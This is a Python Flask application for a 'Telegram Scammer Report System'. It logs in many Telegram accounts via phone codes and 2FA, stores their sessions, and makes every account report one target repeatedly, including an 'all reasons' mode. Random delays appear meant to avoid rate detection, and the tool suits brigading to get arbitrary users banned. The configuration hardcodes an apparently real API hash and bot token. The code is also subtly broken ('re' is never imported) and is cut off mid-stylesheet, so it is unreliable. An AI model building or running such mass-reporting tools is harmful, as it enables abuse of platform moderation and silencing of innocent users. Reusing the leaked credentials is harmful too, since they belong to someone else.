#!/usr/bin/env python3
"""
Telegram Scammer Report System - FIXED REPORTING VERSION
"""

from flask import Flask, jsonify, request, redirect, render_template_string
from flask_cors import CORS
from telethon import TelegramClient, errors, functions, types
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.functions.messages import ReportRequest, ReportSpamRequest
from telethon.tl.functions.contacts import BlockRequest, AddContactRequest
from telethon.tl.types import (
    InputReportReasonSpam, InputReportReasonViolence, 
    InputReportReasonPornography, InputReportReasonChildAbuse,
    InputReportReasonOther, InputReportReasonFake,
    InputReportReasonIllegalDrugs, InputReportReasonPersonalDetails,
    InputReportReasonCopyright, InputPhoneContact
)
from telethon.sessions import StringSession
import json, os, asyncio, logging, logging.handlers, time, random
import threading, requests, traceback, sys, signal
from datetime import datetime, timedelta
from queue import Queue
from threading import Lock
from collections import defaultdict

# ============================================
# LOGGING
# ============================================
os.makedirs('logs', exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.handlers.RotatingFileHandler('logs/server.log', maxBytes=10*1024*1024, backupCount=5),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================
# FLASK APP
# ============================================
app = Flask(__name__)
CORS(app)

# ============================================
# CONFIGURATION
# ============================================
API_ID = int(os.environ.get('API_ID', '33465589'))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A')
PORT = int(os.environ.get('PORT', 10000))
SERVER_URL = os.environ.get('SERVER_URL', 'https://accsell.onrender.com')

# ============================================
# STORAGE
# ============================================
accounts = []
temp_sessions = {}
reports = []
blacklist = set()
report_stats = {
    'total_reports': 0, 'today_reports': 0,
    'successful_reports': 0, 'failed_reports': 0,
    'scammers_reported': 0, 'last_reset': datetime.now().strftime('%Y-%m-%d')
}

file_lock = threading.Lock()
blacklist_lock = threading.Lock()
report_queue = Queue()
MAX_QUEUE_SIZE = 100

# ============================================
# REPORT REASONS
# ============================================
REPORT_REASONS = {
    'spam': {'name': 'Spam', 'icon': '📧', 'reason': InputReportReasonSpam()},
    'fake': {'name': 'Fake Account', 'icon': '🎭', 'reason': InputReportReasonFake()},
    'violence': {'name': 'Violence', 'icon': '⚠️', 'reason': InputReportReasonViolence()},
    'pornography': {'name': 'Inappropriate', 'icon': '🔞', 'reason': InputReportReasonPornography()},
    'drugs': {'name': 'Illegal Drugs', 'icon': '💊', 'reason': InputReportReasonIllegalDrugs()},
    'personal': {'name': 'Personal Info', 'icon': '🔓', 'reason': InputReportReasonPersonalDetails()},
    'copyright': {'name': 'Copyright', 'icon': '©️', 'reason': InputReportReasonCopyright()},
    'scam': {'name': 'Scam/Fraud', 'icon': '💰', 'reason': InputReportReasonOther()},
    'other': {'name': 'Other', 'icon': '📋', 'reason': InputReportReasonOther()}
}

# ============================================
# FILE OPERATIONS
# ============================================
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                data = json.loads(f.read() or 'null')
                return data if data is not None else default
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

def save_json(path, data):
    with file_lock:
        try:
            with open(f"{path}.tmp", 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(f"{path}.tmp", path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")

def load_data():
    global accounts, reports, blacklist, report_stats
    accounts = load_json('accounts.json', [])
    reports = load_json('reports.json', [])
    blacklist = set(load_json('blacklist.json', []))
    
    stats = load_json('report_stats.json', {})
    if stats:
        report_stats.update(stats)
        if report_stats.get('last_reset') != datetime.now().strftime('%Y-%m-%d'):
            report_stats['today_reports'] = 0
            report_stats['last_reset'] = datetime.now().strftime('%Y-%m-%d')
    
    logger.info(f"Loaded: {len(accounts)} accounts, {len(reports)} reports, {len(blacklist)} blacklisted")

# ============================================
# TELEGRAM HELPER - SIMPLIFIED AND FIXED
# ============================================
class TelegramHelper:
    @staticmethod
    def get_event_loop():
        try:
            loop = asyncio.get_event_loop()
            if loop.is_closed():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            return loop
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop
    
    @staticmethod
    def run_async(coro, timeout=60):
        """Run async function safely"""
        loop = TelegramHelper.get_event_loop()
        try:
            return loop.run_until_complete(asyncio.wait_for(coro, timeout=timeout))
        except asyncio.TimeoutError:
            logger.error(f"Operation timed out after {timeout}s")
            raise
        except Exception as e:
            logger.error(f"Async error: {e}")
            raise

    @staticmethod
    async def create_client(session_string):
        """Create and connect a client"""
        client = TelegramClient(
            StringSession(session_string),
            API_ID, API_HASH,
            connection_retries=3,
            retry_delay=2,
            timeout=20,
            auto_reconnect=False
        )
        await client.connect()
        return client

# ============================================
# FIXED RESOLVE FUNCTION
# ============================================
async def resolve_scammer(client, identifier):
    """Resolve scammer with proper error handling"""
    identifier = identifier.strip()
    logger.info(f"Attempting to resolve: {identifier}")
    
    # Method 1: Try as username (remove @ if present)
    username = identifier.lstrip('@')
    try:
        entity = await client.get_entity(username)
        if entity:
            logger.info(f"✅ Resolved as username: @{getattr(entity, 'username', 'N/A')}")
            return entity
    except errors.FloodWaitError as e:
        logger.warning(f"⏳ Flood wait: {e.seconds}s")
        await asyncio.sleep(min(e.seconds, 5))
    except ValueError as e:
        logger.debug(f"Not a username: {e}")
    except Exception as e:
        logger.debug(f"Username resolve error: {e}")
    
    # Method 2: Try as phone number
    phone = re.sub(r'[\s\-\(\)]', '', identifier)
    if not phone.startswith('+'):
        phone = '+' + phone
    
    try:
        # Import contact to resolve
        contact = await client(functions.contacts.ImportContactsRequest([
            InputPhoneContact(client_id=0, phone=phone, first_name="Check", last_name="User")
        ]))
        if contact.users:
            user = contact.users[0]
            logger.info(f"✅ Resolved as phone: {phone}")
            return user
    except errors.FloodWaitError as e:
        logger.warning(f"⏳ Flood wait: {e.seconds}s")
        await asyncio.sleep(min(e.seconds, 5))
    except Exception as e:
        logger.debug(f"Phone resolve error: {e}")
    
    # Method 3: Try direct get_entity with phone
    try:
        entity = await client.get_entity(phone)
        if entity:
            logger.info(f"✅ Resolved via get_entity phone")
            return entity
    except Exception as e:
        logger.debug(f"Direct phone resolve error: {e}")
    
    logger.error(f"❌ Could not resolve: {identifier}")
    return None

# ============================================
# FIXED REPORT FUNCTION
# ============================================
async def report_user_async(session_string, scammer_id, reasons, message=""):
    """Report user with proper error handling and logging"""
    client = None
    results = []
    success_count = 0
    
    try:
        client = await TelegramHelper.create_client(session_string)
        
        # Check if authorized
        if not await client.is_user_authorized():
            logger.error("❌ Account not authorized")
            return {'success': False, 'error': 'Account not authorized', 'results': results}
        
        # Get my info
        me = await client.get_me()
        logger.info(f"📱 Reporting as: {me.first_name} (@{me.username or 'N/A'})")
        
        # Resolve scammer
        scammer = await resolve_scammer(client, scammer_id)
        if not scammer:
            return {'success': False, 'error': f'Could not find user: {scammer_id}', 'results': results}
        
        scammer_info = {
            'id': str(scammer.id),
            'username': getattr(scammer, 'username', 'N/A'),
            'first_name': getattr(scammer, 'first_name', 'N/A'),
            'is_scam': getattr(scammer, 'scam', False)
        }
        logger.info(f"🎯 Target: {scammer_info['first_name']} (@{scammer_info['username']}) ID:{scammer_info['id']}")
        
        # Report with each reason
        for reason_key in reasons:
            reason_data = REPORT_REASONS.get(reason_key)
            if not reason_data:
                continue
            
            reason_obj = reason_data['reason']
            reason_name = reason_data['name']
            report_msg = f"REPORT: {reason_name} violation. {message}" if message else f"REPORT: {reason_name} violation"
            
            # Method 1: report_peer (most effective)
            try:
                await client(ReportPeerRequest(
                    peer=scammer,
                    reason=reason_obj,
                    message=report_msg
                ))
                results.append({'method': 'report_peer', 'reason': reason_key, 'status': 'success'})
                success_count += 1
                logger.info(f"  ✅ report_peer: {reason_name}")
            except errors.FloodWaitError as e:
                logger.warning(f"  ⏳ Flood wait {e.seconds}s for {reason_name}")
                await asyncio.sleep(min(e.seconds, 3))
            except Exception as e:
                logger.error(f"  ❌ report_peer failed for {reason_name}: {str(e)[:100]}")
                results.append({'method': 'report_peer', 'reason': reason_key, 'status': 'failed', 'error': str(e)[:100]})
            
            # Small delay between reports
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            # Method 2: messages.Report
            try:
                await client(ReportRequest(
                    peer=scammer,
                    id=[0],
                    reason=reason_obj,
                    message=report_msg
                ))
                success_count += 1
                logger.info(f"  ✅ messages.report: {reason_name}")
            except errors.FloodWaitError as e:
                await asyncio.sleep(min(e.seconds, 3))
            except Exception as e:
                logger.debug(f"  messages.report failed: {str(e)[:50]}")
            
            await asyncio.sleep(random.uniform(0.5, 1.0))
        
        # Block the user
        try:
            await client(BlockRequest(scammer))
            results.append({'method': 'block', 'status': 'success'})
            logger.info(f"  ✅ Blocked user")
        except Exception as e:
            logger.debug(f"  Block failed: {e}")
        
        # Report spam
        try:
            await client(ReportSpamRequest(peer=scammer))
            results.append({'method': 'report_spam', 'status': 'success'})
            logger.info(f"  ✅ Reported spam")
        except Exception as e:
            logger.debug(f"  Report spam failed: {e}")
        
        return {
            'success': success_count > 0,
            'scammer_info': scammer_info,
            'reasons_used': len(reasons),
            'successful_reports': success_count,
            'results': results,
            'reported_by': f"{me.first_name} (@{me.username or 'N/A'})"
        }
        
    except errors.rpcerrorlist.UserDeactivatedBanError:
        logger.error("❌ Account is banned!")
        return {'success': False, 'error': 'Account is banned/deactivated', 'results': results}
    except errors.rpcerrorlist.AuthKeyUnregisteredError:
        logger.error("❌ Session expired")
        return {'success': False, 'error': 'Session expired. Please re-login.', 'results': results}
    except Exception as e:
        logger.error(f"❌ Report error: {str(e)[:200]}")
        return {'success': False, 'error': str(e)[:200], 'results': results}
    finally:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except:
                pass

# ============================================
# FIXED MASS REPORT
# ============================================
def mass_report(scammer_id, reasons, message=""):
    """Report using all active accounts"""
    all_results = []
    total_success = 0
    total_reports_sent = 0
    
    # Check for active accounts with valid sessions
    active_accounts = []
    for acc in accounts:
        session = acc.get('session', '')
        if not session:
            logger.warning(f"⚠️ Account {acc.get('name')} has no session")
            continue
        
        # Mark as active for now, will be updated after report attempt
        active_accounts.append(acc)
    
    if not active_accounts:
        return {'success': False, 'error': 'No accounts with valid sessions', 'results': []}
    
    logger.info(f"🚨 MASS REPORT: {scammer_id} | {len(active_accounts)} accounts | {len(reasons)} reasons")
    
    for i, acc in enumerate(active_accounts):
        acc_name = acc.get('name', f'Account {i+1}')
        logger.info(f"📱 Using account: {acc_name}")
        
        try:
            result = TelegramHelper.run_async(
                report_user_async(acc['session'], scammer_id, reasons, message),
                timeout=120
            )
            
            all_results.append({
                'account': acc_name,
                'phone': (acc.get('phone', '') or '****')[:3] + '****',
                'result': result
            })
            
            if result.get('success'):
                total_success += 1
                total_reports_sent += result.get('successful_reports', 0)
                acc['active'] = True
            else:
                # If session expired, mark as inactive
                if 'expired' in result.get('error', '').lower() or 'authorized' in result.get('error', '').lower():
                    acc['active'] = False
                    logger.warning(f"⚠️ Marked {acc_name} as inactive")
            
        except Exception as e:
            logger.error(f"❌ Account {acc_name} failed completely: {e}")
            all_results.append({
                'account': acc_name,
                'result': {'success': False, 'error': str(e)[:100]}
            })
            acc['active'] = False
        
        # Delay between accounts
        if i < len(active_accounts) - 1:
            time.sleep(random.uniform(2, 5))
    
    # Save updated account statuses
    save_json('accounts.json', accounts)
    
    # Update stats
    report_stats['total_reports'] += total_reports_sent
    report_stats['today_reports'] += total_reports_sent
    report_stats['successful_reports'] += total_success
    if total_success > 0:
        report_stats['scammers_reported'] += 1
        with blacklist_lock:
            blacklist.add(scammer_id.lower())
        save_json('blacklist.json', list(blacklist))
    else:
        report_stats['failed_reports'] += 1
    
    save_json('report_stats.json', report_stats)
    
    # Save report record
    report_record = {
        'id': int(time.time() * 1000),
        'scammer': scammer_id,
        'reasons': reasons,
        'message': message,
        'accounts_used': len(active_accounts),
        'successful_accounts': total_success,
        'total_reports_sent': total_reports_sent,
        'timestamp': datetime.now().isoformat(),
        'results': all_results
    }
    reports.append(report_record)
    if len(reports) > 1000:
        reports.pop(0)
    save_json('reports.json', reports)
    
    logger.info(f"✅ MASS REPORT DONE: {total_success}/{len(active_accounts)} success, {total_reports_sent} reports")
    
    return {
        'success': total_success > 0,
        'scammer': scammer_id,
        'accounts_used': len(active_accounts),
        'successful_accounts': total_success,
        'total_reports_sent': total_reports_sent,
        'results': all_results
    }

# ============================================
# HTML TEMPLATES (KEPT AS IS FROM YOUR CODE)
# ============================================

LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scammer Report System</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }
        h1 { color: #333; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #666; margin-bottom: 30px; }
        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; }
        .nav-link {
            padding: 10px 20px;
            background: #f8f9fa;
            border-radius: 8px;
            text-decoration: none;
            color: #495057;
            transition: all 0.3s;
        }
        .nav-link.active { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-danger { background: linear-gradient(135deg, #f56565 0%, #ed8936 100%); }
        .btn-success { background: linear-gradient(135deg, #48bb78 0%, #38a169 100%); }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 16px;
            margin-bottom: 15px;
        }
        input:focus { outline: none; border-color: #667eea; }
        .status { padding: 10px; border-radius: 8px; margin: 10px 0; display: none; }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .status.info { background: #bee3f8; color: #2a4365; display: block; }
        .account-card {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 2px solid #e9ecef;
        }
        .account-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            margin-bottom: 10px;
            border: 1px solid #e9ecef;
        }
        .account-name { font-weight: bold; color: #333; }
        .account-phone { color: #666; font-size: 14px; }
        .account-status {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .account-status.active { background: #c6f6d5; color: #22543d; }
        .account-status.inactive { background: #fed7d7; color: #742a2a; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-bar">
            <a href="/login" class="nav-link active">📱 Accounts</a>
            <a href="/report" class="nav-link">🚨 Report</a>
            <a href="/stats" class="nav-link">📊 Stats</a>
        </div>
        <h1>📱 Account Management</h1>
        <p class="subtitle">Add Telegram accounts for reporting scammers</p>
        
        <div class="account-card">
            <h3>➕ Add New Account</h3>
            <input type="tel" id="phoneInput" placeholder="+1234567890" />
            <button class="btn" onclick="addAccount()" id="addBtn">Send Verification Code</button>
        </div>
        
        <div id="verificationSection" style="display:none;" class="account-card">
            <h3>🔐 Verify Code</h3>
            <input type="text" id="codeInput" placeholder="Enter verification code" maxlength="5" />
            <input type="password" id="passwordInput" placeholder="2FA Password (if enabled)" style="display:none;" />
            <button class="btn btn-success" onclick="verifyCode()" id="verifyBtn">Verify & Add Account</button>
        </div>
        
        <div id="status" class="status"></div>
        
        <div class="account-list">
            <h3>📋 Your Accounts (<span id="accountCount">0</span>)</h3>
            <div id="accountsList"></div>
            <button class="btn btn-success" onclick="refreshSessions()" style="margin-top:15px;">🔄 Refresh All Sessions</button>
        </div>
    </div>
    
    <script>
        let currentSessionId = '';
        
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.className = 'status ' + type;
            status.textContent = message;
            setTimeout(() => { status.className = 'status'; }, 5000);
        }
        
        function loadAccounts() {
            fetch('/api/accounts')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('accountCount').textContent = data.count;
                    let html = '';
                    data.accounts.forEach(acc => {
                        html += `
                            <div class="account-item">
                                <div class="account-info">
                                    <div class="account-name">${acc.name}</div>
                                    <div class="account-phone">${acc.phone}</div>
                                </div>
                                <span class="account-status ${acc.active ? 'active' : 'inactive'}">
                                    ${acc.active ? '✅ Active' : '❌ Inactive'}
                                </span>
                                <button class="btn btn-danger" style="width:auto;margin-left:10px;padding:8px 15px;font-size:12px;" 
                                        onclick="removeAccount(${acc.id})">Remove</button>
                            </div>
                        `;
                    });
                    document.getElementById('accountsList').innerHTML = html || '<p style="color:#666;">No accounts yet</p>';
                });
        }
        
        function addAccount() {
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) { showStatus('Please enter a phone number', 'error'); return; }
            
            const btn = document.getElementById('addBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span> Sending...';
            
            fetch('/api/add-account', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            })
            .then(r => r.json())
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = 'Send Verification Code';
                if (data.success) {
                    currentSessionId = data.session_id;
                    document.getElementById('verificationSection').style.display = 'block';
                    showStatus(`Code sent to ${data.phone_masked}`, 'success');
                } else {
                    showStatus(data.error || 'Failed', 'error');
                }
            })
            .catch(() => {
                btn.disabled = false;
                btn.innerHTML = 'Send Verification Code';
                showStatus('Network error', 'error');
            });
        }
        
        function verifyCode() {
            const code = document.getElementById('codeInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            if (!code) { showStatus('Please enter code', 'error'); return; }
            
            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span> Verifying...';
            
            fetch('/api/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({code: code, session_id: currentSessionId, password: password})
            })
            .then(r => r.json())
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = 'Verify & Add Account';
                if (data.need_password) {
                    document.getElementById('passwordInput').style.display = 'block';
                    showStatus('Enter 2FA password', 'info');
                } else if (data.success) {
                    document.getElementById('verificationSection').style.display = 'none';
                    document.getElementById('phoneInput').value = '';
                    document.getElementById('codeInput').value = '';
                    showStatus('Account added!', 'success');
                    loadAccounts();
                } else {
                    showStatus(data.error || 'Failed', 'error');
                }
            })
            .catch(() => {
                btn.disabled = false;
                btn.innerHTML = 'Verify & Add Account';
                showStatus('Network error', 'error');
            });
        }
        
        function removeAccount(id) {
            if (!confirm('Remove this account?')) return;
            fetch('/api/remove-account', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({accountId: id})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) { showStatus(data.message, 'success'); loadAccounts(); }
            });
        }
        
        function refreshSessions() {
            fetch('/api/refresh-sessions', {method: 'POST'})
                .then(r => r.json())
                .then(data => { if (data.success) { showStatus(data.message, 'success'); loadAccounts(); } });
        }
        
        loadAccounts();
        setInterval(loadAccounts, 30000);
    </script>
</body>
</html>
'''

REPORT_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Report Scammer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 600px;
            width: 100%;
        }
        h1 { color: #333; margin-bottom: 10px; }
        .subtitle { color: #666; margin-bottom: 30px; }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 16px;
            margin-bottom: 15px;
        }
        input:focus, textarea:focus { outline: none; border-color: #f5576c; }
        textarea { resize: vertical; min-height: 80px; }
        .reasons-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 10px;
            margin-bottom: 20px;
        }
        .reason-btn {
            padding: 12px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            font-size: 14px;
        }
        .reason-btn:hover { border-color: #f5576c; }
        .reason-btn.selected {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border-color: transparent;
        }
        .btn {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            font-weight: bold;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-emergency { background: linear-gradient(135deg, #f56565 0%, #c53030 100%); margin-top: 5px; }
        .status { padding: 15px; border-radius: 10px; margin: 15px 0; display: none; font-weight: 500; }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .status.info { background: #bee3f8; color: #2a4365; display: block; }
        .result-details {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            display: none;
            max-height: 300px;
            overflow-y: auto;
        }
        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; }
        .nav-link {
            padding: 10px 20px;
            background: #f8f9fa;
            border-radius: 8px;
            text-decoration: none;
            color: #495057;
            transition: all 0.3s;
        }
        .nav-link.active { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .progress-bar {
            width: 100%;
            height: 5px;
            background: #e9ecef;
            border-radius: 5px;
            margin: 10px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            width: 0%;
            transition: width 0.3s;
        }
        .result-item {
            padding: 8px;
            margin: 5px 0;
            border-radius: 5px;
            font-size: 14px;
        }
        .result-item.success { background: #f0fff4; border-left: 3px solid #48bb78; }
        .result-item.failed { background: #fff5f5; border-left: 3px solid #f56565; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-bar">
            <a href="/login" class="nav-link">📱 Accounts</a>
            <a href="/report" class="nav-link active">🚨 Report</a>
            <a href="/stats" class="nav-link">📊 Stats</a>
        </div>
        <h1>🚨 Report Scammer</h1>
        <p class="subtitle">Submit a report to get scammers banned from Telegram</p>
        
        <input type="text" id="scammerInput" placeholder="Scammer's @username or +phone" />
        
        <h3 style="margin-bottom:10px;">Select Report Reasons:</h3>
        <div class="reasons-grid" id="reasonsGrid"></div>
        
        <textarea id="messageInput" placeholder="Additional details (optional)"></textarea>
        
        <button class="btn" onclick="submitReport()" id="reportBtn">🚨 Submit Report</button>
        <button class="btn btn-emergency" onclick="emergencyReport()" id="emergencyBtn">⚡ EMERGENCY (All Reasons)</button>
        
        <div class="progress-bar" id="progressBar" style="display:none;">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div id="status" class="status"></div>
        <div id="resultDetails" class="result-details"></div>
    </div>
    
    <script>
        let selectedReasons = new Set();
        
        function loadReasons() {
            fetch('/api/report-reasons')
                .then(r => r.json())
                .then(data => {
                    let html = '';
                    data.reasons.forEach(reason => {
                        html += `<div class="reason-btn" onclick="toggleReason('${reason.key}', this)">
                            ${reason.icon} ${reason.name}
                        </div>`;
                    });
                    document.getElementById('reasonsGrid').innerHTML = html;
                });
        }
        
        function toggleReason(key, element) {
            if (selectedReasons.has(key)) {
                selectedReasons.delete(key);
                element.classList.remove('selected');
            } else {
                selectedReasons.add(key);
                element.classList.add('selected');
            }
        }
        
        function showStatus(message, type) {
            document.getElementById('status').className = 'status ' + type;
            document.getElementById('status').textContent = message;
        }
        
        function showResults(results) {
            let html = '<h4>Report Results:</h4>';
            results.forEach(r => {
                const success = r.result.success;
                html += `<div class="result-item ${success ? 'success' : 'failed'}">
                    <strong>${success ? '✅' : '❌'} ${r.account}</strong>: 
                    ${r.result.error || (r.result.successful_reports || 0) + ' reports sent'}
                </div>`;
            });
            document.getElementById('resultDetails').innerHTML = html;
            document.getElementById('resultDetails').style.display = 'block';
        }
        
        async function submitReport() {
            const scammer = document.getElementById('scammerInput').value.trim();
            const message = document.getElementById('messageInput').value.trim();
            
            if (!scammer) { showStatus('Enter username or phone', 'error'); return; }
            if (selectedReasons.size === 0) { showStatus('Select at least one reason', 'error'); return; }
            
            const btn = document.getElementById('reportBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span> Reporting...';
            document.getElementById('progressBar').style.display = 'block';
            document.getElementById('progressFill').style.width = '30%';
            
            try {
                const res = await fetch('/api/report', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        scammer: scammer,
                        reasons: Array.from(selectedReasons),
                        message: message,
                        immediate: true
                    })
                });
                
                document.getElementById('progressFill').style.width = '80%';
                const data = await res.json();
                
                if (data.success) {
                    showStatus(`✅ Success! ${data.total_reports_sent || 0} reports sent by ${data.successful_accounts || 0} accounts`, 'success');
                    if (data.results) showResults(data.results);
                    document.getElementById('scammerInput').value = '';
                    document.getElementById('messageInput').value = '';
                    selectedReasons.clear();
                    document.querySelectorAll('.reason-btn').forEach(b => b.classList.remove('selected'));
                } else {
                    showStatus(`❌ ${data.error || 'Report failed'}`, 'error');
                    if (data.results) showResults(data.results);
                }
            } catch (err) {
                showStatus('Network error. Try again.', 'error');
            } finally {
                btn.disabled = false;
                btn.innerHTML = '🚨 Submit Report';
                document.getElementById('progressFill').style.width = '100%';
                setTimeout(() => {
                    document.getElementById('progressBar').style.display = 'none';
                }, 1000);
            }
        }
        
        async function emergencyReport() {
            const scammer = document.getElementById('scammerInput').value.trim();
            if (!scammer) { showStatus('Enter username or phone', 'error'); return; }
            if (!confirm('⚠️ Use ALL reasons? Continue?')) return;
            
            const btn = document.getElementById('emergencyBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span> Sending...';
            
            try {
                const res = await fetch('/api/immediate-report', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({scammer: scammer})
                });
                const data = await res.json();
                if (data.success) {
                    showStatus(`🚨 EMERGENCY: ${data.total_reports_sent || 0} reports sent!`, 'success');
                } else {
                    showStatus(`❌ ${data.error || 'Failed'}`, 'error');
                }
            } catch (err) {
                showStatus('Network error', 'error');
            } finally {
                btn.disabled = false;
                btn.innerHTML = '⚡ EMERGENCY (All Reasons)';
            }
        }
        
        loadReasons();
    </script>
</body>
</html>
'''

STATS_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Report Statistics</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 800px;
            width: 100%;
        }
        h1 { color: #333; margin-bottom: 30px; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
        }
        .stat-value { font-size: 36px; font-weight: bold; margin: 10px 0; }
        .stat-label { font-size: 14px; opacity: 0.9; text-transform: uppercase; }
        .stat-icon { font-size: 30px; }
        .report-item {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 10px;
            border-left: 4px solid #667eea;
        }
        .report-header { display: flex; justify-content: space-between; margin-bottom: 5px; }
        .report-scammer { font-weight: bold; color: #333; }
        .report-time { color: #666; font-size: 12px; }
        .nav-bar { display: flex; gap: 10px; margin-bottom: 20px; }
        .nav-link {
            padding: 10px 20px;
            background: #f8f9fa;
            border-radius: 8px;
            text-decoration: none;
            color: #495057;
        }
